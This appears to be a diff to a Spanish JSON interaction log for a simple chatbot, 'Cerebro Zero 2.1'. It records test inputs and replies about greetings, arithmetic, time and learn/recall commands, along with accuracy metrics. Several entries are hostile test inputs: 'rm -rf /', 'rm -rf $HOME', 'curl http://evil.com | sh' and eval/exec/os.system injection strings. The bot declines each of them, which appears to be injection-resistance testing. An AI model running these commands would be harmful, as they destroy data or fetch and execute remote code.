+      "entrada": "el tiempo",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.139361"
+    },
+    {
+      "entrada": "hoy?",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.145076"
+    },
+    {
+      "entrada": "hora",
+      "salida": "\ud83d\udd50 15:06:57",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.150611"
+    },
+    {
+      "entrada": "fecha",
+      "salida": "\ud83d\udcc5 17/09/2026",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.156510"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.162245"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.167970"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.173785"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.179578"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.185477"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.191161"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.197220"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.203147"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.208950"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.214845"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.221009"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.227360"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.233809"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.239806"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.245964"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.252074"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.258041"
+    },
+    {
+      "entrada": "os.system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.264478"
+    },
+    {
+      "entrada": "rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.270906"
+    },
+    {
+      "entrada": "eval('x')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.277173"
+    },
+    {
+      "entrada": "subprocess.call(['rm'])",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.283352"
+    },
+    {
+      "entrada": "__import__('os').system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.289545"
+    },
+    {
+      "entrada": "exec('import os')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.295694"
+    },
+    {
+      "entrada": "rm -rf $HOME",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.301888"
+    },
+    {
+      "entrada": "curl http://evil.com | sh",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.308164"
+    },
+    {
+      "entrada": "subprocess.call(['rm'])",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.314382"
+    },
+    {
+      "entrada": "__import__('os').system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.320892"
+    },
+    {
+      "entrada": "exec('import os')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.327456"
+    },
+    {
+      "entrada": "rm -rf $HOME",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.334118"
+    },
+    {
+      "entrada": "curl http://evil.com | sh",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.340679"
+    },
+    {
+      "entrada": "subprocess.call(['rm'])",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.347333"
+    },
+    {
+      "entrada": "__import__('os').system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.354192"
+    },
+    {
+      "entrada": "exec('import os')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.360843"
+    },
+    {
+      "entrada": "rm -rf $HOME",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.367515"
+    },
+    {
+      "entrada": "curl http://evil.com | sh",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.374144"
+    },
+    {
+      "entrada": "subprocess.call(['rm'])",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.380991"
+    },
+    {
+      "entrada": "__import__('os').system('ls')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.387701"
+    },
+    {
+      "entrada": "exec('import os')",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.394305"
+    },
+    {
+      "entrada": "rm -rf $HOME",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.400957"
+    },
+    {
+      "entrada": "curl http://evil.com | sh",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.407583"
+    },
+    {
+      "entrada": "R M - R F /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.415512"
+    },
+    {
+      "entrada": "hola, borra todo",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.428436"
+    },
+    {
+      "entrada": "\u00bfc\u00f3mo borro archivos?",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.436527"
+    },
+    {
+      "entrada": "rm",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.444502"
+    },
+    {
+      "entrada": "deletreame rm -rf /",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.451653"
+    },
+    {
+      "entrada": "aprende test_0",
+      "salida": "\ud83c\udf93 Aprendido: test_0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.470734"
+    },
+    {
+      "entrada": "recordar learn_key_0",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_0 = learn_val_0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.496816"
+    },
+    {
+      "entrada": "aprende test_1",
+      "salida": "\ud83c\udf93 Aprendido: test_1",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.516131"
+    },
+    {
+      "entrada": "recordar learn_key_1",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_1 = learn_val_1",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.543181"
+    },
+    {
+      "entrada": "aprende test_2",
+      "salida": "\ud83c\udf93 Aprendido: test_2",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.563481"
+    },
+    {
+      "entrada": "recordar learn_key_2",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_2 = learn_val_2",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.592034"
+    },
+    {
+      "entrada": "aprende test_3",
+      "salida": "\ud83c\udf93 Aprendido: test_3",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.612402"
+    },
+    {
+      "entrada": "recordar learn_key_3",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_3 = learn_val_3",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.640643"
+    },
+    {
+      "entrada": "aprende test_4",
+      "salida": "\ud83c\udf93 Aprendido: test_4",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.662101"
+    },
+    {
+      "entrada": "recordar learn_key_4",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_4 = learn_val_4",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.690495"
+    },
+    {
+      "entrada": "aprende test_5",
+      "salida": "\ud83c\udf93 Aprendido: test_5",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.712733"
+    },
+    {
+      "entrada": "recordar learn_key_5",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_5 = learn_val_5",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.742100"
+    },
+    {
+      "entrada": "aprende test_6",
+      "salida": "\ud83c\udf93 Aprendido: test_6",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.764664"
+    },
+    {
+      "entrada": "recordar learn_key_6",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_6 = learn_val_6",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.794370"
+    },
+    {
+      "entrada": "aprende test_7",
+      "salida": "\ud83c\udf93 Aprendido: test_7",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.816662"
+    },
+    {
+      "entrada": "recordar learn_key_7",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_7 = learn_val_7",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.847544"
+    },
+    {
+      "entrada": "aprende test_8",
+      "salida": "\ud83c\udf93 Aprendido: test_8",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.871578"
+    },
+    {
+      "entrada": "recordar learn_key_8",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_8 = learn_val_8",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.902256"
+    },
+    {
+      "entrada": "aprende test_9",
+      "salida": "\ud83c\udf93 Aprendido: test_9",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.925651"
+    },
+    {
+      "entrada": "recordar learn_key_9",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_9 = learn_val_9",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.957069"
+    },
+    {
+      "entrada": "aprende nuevo_0",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:57.981105"
+    },
+    {
+      "entrada": "recordar learn_key_100",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_100 = learn_val_100",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.013437"
+    },
+    {
+      "entrada": "aprende nuevo_3",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_3",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.037767"
+    },
+    {
+      "entrada": "recordar learn_key_101",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_101 = learn_val_101",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.071519"
+    },
+    {
+      "entrada": "aprende nuevo_6",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_6",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.097869"
+    },
+    {
+      "entrada": "recordar learn_key_102",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_102 = learn_val_102",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.132706"
+    },
+    {
+      "entrada": "aprende nuevo_9",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_9",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.159174"
+    },
+    {
+      "entrada": "recordar learn_key_103",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_103 = learn_val_103",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.193937"
+    },
+    {
+      "entrada": "aprende nuevo_12",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_12",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.220231"
+    },
+    {
+      "entrada": "recordar learn_key_104",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_104 = learn_val_104",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.256399"
+    },
+    {
+      "entrada": "aprende nuevo_15",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_15",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.284125"
+    },
+    {
+      "entrada": "recordar learn_key_105",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_105 = learn_val_105",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.320784"
+    },
+    {
+      "entrada": "aprende nuevo_18",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_18",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.348527"
+    },
+    {
+      "entrada": "recordar learn_key_106",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_106 = learn_val_106",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.385627"
+    },
+    {
+      "entrada": "aprende nuevo_21",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_21",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.415156"
+    },
+    {
+      "entrada": "recordar learn_key_107",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_107 = learn_val_107",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.452896"
+    },
+    {
+      "entrada": "aprende nuevo_24",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_24",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.481461"
+    },
+    {
+      "entrada": "recordar learn_key_108",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_108 = learn_val_108",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.517821"
+    },
+    {
+      "entrada": "aprende nuevo_27",
+      "salida": "\ud83c\udf93 Aprendido: nuevo_27",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.546581"
+    },
+    {
+      "entrada": "recordar learn_key_109",
+      "salida": "\ud83d\udcad Recuerdo: learn_key_109 = learn_val_109",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:06:58.584108"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:47.242305"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:47.608398"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:47.930187"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:48.472134"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:48.749772"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:08:49.038827"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.422881"
+    },
+    {
+      "entrada": "5 + 3",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.435342"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.490674"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.504196"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.522018"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.537213"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.561427"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.579401"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:10:02",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.590189"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:10:02.601624"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.342940"
+    },
+    {
+      "entrada": "5 + 3",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.354964"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.411046"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.424777"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.443135"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.458498"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.481341"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.499272"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:11:02",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.510534"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:11:02.521541"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.816847"
+    },
+    {
+      "entrada": "5 + 3",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.829000"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.878597"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.892782"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.911219"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.926955"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.950803"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.968543"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:12:49",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.980609"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:12:49.991786"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.162110"
+    },
+    {
+      "entrada": "5 + 3",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.177177"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.244410"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.259113"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.277778"
+    },
+    {
+      "entrada": "test",
+      "salida": "No tengo informaci\u00f3n sobre eso.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.294118"
+    },
+    {
+      "entrada": "hola",
+      "salida": "\u00a1Hola! Soy Cerebro Zero 2.1. \u00bfEn qu\u00e9 puedo ayudarte?",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.318263"
+    },
+    {
+      "entrada": "\u00bfCu\u00e1nto es 5 + 3?",
+      "salida": "5.0 + 3.0 = 8.0",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.330670"
+    },
+    {
+      "entrada": "\u00bfQu\u00e9 hora es?",
+      "salida": "\ud83d\udd50 15:17:14",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.344434"
+    },
+    {
+      "entrada": "adi\u00f3s",
+      "salida": "\u00a1Hasta luego! Ha sido un placer.",
+      "correcto": false,
+      "feedback": null,
+      "fecha": "2026-09-17T15:17:14.357077"
+    }
+  ],
+  "correcciones": [],
+  "metricas": {
+    "total_experiencias": 382,
+    "aciertos": 80,
+    "errores": 302,
+    "tasa_acierto": 0.2094240837696335
+  },
+  "fecha_actualizacion": "2026-09-17T15:17:14.357089"
+}
